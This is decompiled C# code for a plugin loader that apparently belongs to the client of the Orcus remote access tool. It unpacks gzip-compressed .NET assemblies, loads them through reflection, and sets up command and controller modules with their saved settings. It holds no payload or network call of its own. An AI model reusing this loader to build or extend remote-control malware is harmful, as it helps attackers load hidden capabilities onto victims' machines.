using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins.Builder;
using Orcus.Plugins.ClientPlugin;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Plugins;

public class PluginLoader
{
	private static PluginLoader _current;

	public Dictionary<PluginResourceInfo, bool> AvailablePlugins { get; }

	public List<ClientController> ClientPlugins { get; }

	public List<IFactoryClientCommand> FactoryCommandPlugins { get; }

	public List<ILoadable> Loadables { get; }

	public List<Type> Commands { get; }

	public static PluginLoader Current => _current ?? (_current = new PluginLoader());

	public event EventHandler<CommandLoadedEventArgs> CommandLoaded;

	private PluginLoader()
	{
		Loadables = new List<ILoadable>();
		ClientPlugins = new List<ClientController>();
		FactoryCommandPlugins = new List<IFactoryClientCommand>();
		Commands = new List<Type>();
		AvailablePlugins = new Dictionary<PluginResourceInfo, bool>();
	}

	public void LoadPlugins(List<PluginResourceInfo> plugins)
	{
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected I4, but got Unknown
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_01f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_0272: Unknown result type (might be due to invalid IL or missing references)
		if (plugins.Count == 0)
		{
			return;
		}
		Assembly entryAssembly = Assembly.GetEntryAssembly();
		Guid[] source = new Guid[1]
		{
			new Guid(new byte[16]
			{
				116, 86, 238, 230, 148, 187, 199, 70, 139, 188,
				87, 41, 175, 110, 44, 40
			})
		};
		Dictionary<ClientController, Guid> clientPluginIds = new Dictionary<ClientController, Guid>();
		foreach (PluginResourceInfo plugin in plugins)
		{
			if (source.Contains(plugin.get_Guid()))
			{
				continue;
			}
			AvailablePlugins.Add(plugin, value: false);
			Stream manifestResourceStream = entryAssembly.GetManifestResourceStream(plugin.get_ResourceName());
			if (manifestResourceStream == null)
			{
				continue;
			}
			Assembly assembly;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				StreamExtensions.CopyToEx(manifestResourceStream, (Stream)memoryStream);
				manifestResourceStream.Dispose();
				assembly = Assembly.Load(Decompress(memoryStream.ToArray()));
			}
			try
			{
				Type[] types = assembly.GetTypes();
				ResourceType resourceType = plugin.get_ResourceType();
				switch ((int)resourceType)
				{
				default:
					goto end_IL_00cb;
				case 0:
				{
					Type item = types.First((Type x) => x.IsSubclassOf(typeof(Command)));
					Commands.Add(item);
					break;
				}
				case 1:
				{
					ClientController val2 = (ClientController)Activator.CreateInstance(types.First((Type x) => x.IsSubclassOf(typeof(ClientController))));
					try
					{
						val2.Initialize((IClientOperator)(object)ClientOperator.Instance);
					}
					catch (Exception exception2)
					{
						ErrorReporter.Current.ReportError(exception2, string.Concat("Initialize() (ClientPlugin) at plugin: \"", ((object)val2).GetType(), "\""));
					}
					ClientPlugins.Add(val2);
					Loadables.Add((ILoadable)(object)val2);
					clientPluginIds.Add(val2, plugin.get_Guid());
					break;
				}
				case 2:
				{
					IFactoryClientCommand val = (IFactoryClientCommand)Activator.CreateInstance(types.First((Type x) => (object)x.GetInterface("IFactoryClientCommand") != null));
					FactoryCommandPlugins.Add(val);
					try
					{
						val.get_Factory().Initialize((IClientOperator)(object)ClientOperator.Instance);
					}
					catch (Exception exception)
					{
						ErrorReporter.Current.ReportError(exception, string.Concat("Initialize() (FactoryCommand) at plugin: \"", ((object)val).GetType(), "\""));
					}
					Loadables.Add((ILoadable)(object)val.get_Factory());
					break;
				}
				}
				AvailablePlugins[plugin] = true;
				end_IL_00cb:;
			}
			catch (Exception exception3)
			{
				ErrorReporter.Current.ReportError(exception3, $"Error loading and creating {plugin.get_ResourceType()} of plugin {plugin.get_PluginName()}");
			}
		}
		List<Type> list = new List<Type>();
		List<ClientControllerProvideEditablePropertyGrid> list2 = new List<ClientControllerProvideEditablePropertyGrid>();
		List<ClientControllerBuilderSettings> list3 = new List<ClientControllerBuilderSettings>();
		foreach (ClientController clientPlugin in ClientPlugins)
		{
			ClientControllerProvideEditablePropertyGrid val3 = (ClientControllerProvideEditablePropertyGrid)(object)((clientPlugin is ClientControllerProvideEditablePropertyGrid) ? clientPlugin : null);
			if (val3 != null)
			{
				list.AddRange(from x in val3.get_Properties()
					select x.get_PropertyType());
				list2.Add(val3);
				continue;
			}
			ClientControllerBuilderSettings val4 = (ClientControllerBuilderSettings)(object)((clientPlugin is ClientControllerBuilderSettings) ? clientPlugin : null);
			if (val4 != null)
			{
				list.AddRange(from x in val4.get_BuilderSettings()
					select ((object)x.get_BuilderProperty()).GetType());
				list3.Add(val4);
			}
		}
		if (list2.Count == 0 && list3.Count == 0)
		{
			return;
		}
		List<PluginSetting> pluginSettings = Settings.GetPluginSettings(list);
		foreach (ClientControllerProvideEditablePropertyGrid clientController2 in list2)
		{
			PluginSetting val5 = ((IEnumerable<PluginSetting>)pluginSettings).FirstOrDefault((Func<PluginSetting, bool>)((PluginSetting x) => x.get_PluginId() == clientPluginIds[(ClientController)(object)clientController2]));
			if (val5 != null)
			{
				PropertyGridExtensions.InitializeProperties((object)clientController2, ((ClientSetting)val5).get_Properties());
			}
		}
		foreach (ClientControllerBuilderSettings clientController in list3)
		{
			List<PluginSetting> list4 = pluginSettings.Where((PluginSetting x) => x.get_PluginId() == clientPluginIds[(ClientController)(object)clientController]).ToList();
			if (list4.Count <= 0)
			{
				continue;
			}
			List<IBuilderProperty> list5 = new List<IBuilderProperty>();
			foreach (PluginSetting item2 in list4)
			{
				Type type = Type.GetType(((ClientSetting)item2).get_SettingsType());
				if ((object)type != null)
				{
					object? obj = Activator.CreateInstance(type);
					IBuilderProperty val6 = (IBuilderProperty)((obj is IBuilderProperty) ? obj : null);
					if (val6 != null)
					{
						BuilderPropertyHelper.ApplyProperties(val6, ((ClientSetting)item2).get_Properties());
						list5.Add(val6);
					}
				}
			}
			clientController.InitializeSettings(list5);
		}
	}

	public void LoadPlugin(string file, PluginVersion pluginVersion)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		Type type = Assembly.Load(Decompress(File.ReadAllBytes(file))).GetTypes().First((Type x) => x.IsSubclassOf(typeof(Command)));
		try
		{
			Command command = (Command)Activator.CreateInstance(type);
			if (command == null)
			{
				ErrorReporter.Current.ReportError(new Exception("Command could not be created"), "LoadPlugin: Check");
				return;
			}
			if (command.get_Identifier() < 1000)
			{
				ErrorReporter.Current.ReportError(new Exception("Command Id below 1000"), "LoadPlugin: Check");
				return;
			}
			Command val = ((IEnumerable<Type>)Commands).Select((Func<Type, Command>)((Type x) => (Command)Activator.CreateInstance(x))).FirstOrDefault((Func<Command, bool>)((Command x) => x.get_Identifier() == command.get_Identifier()));
			if (val != null)
			{
				Commands.Remove(((object)val).GetType());
			}
		}
		catch (Exception exception)
		{
			ErrorReporter.Current.ReportError(exception, "LoadPlugin: Check");
			return;
		}
		Commands.Add(type);
		this.CommandLoaded?.Invoke(this, new CommandLoadedEventArgs(type));
	}

	private static byte[] Decompress(byte[] gzip)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress);
		byte[] buffer = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num;
		do
		{
			num = gZipStream.Read(buffer, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(buffer, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}
}
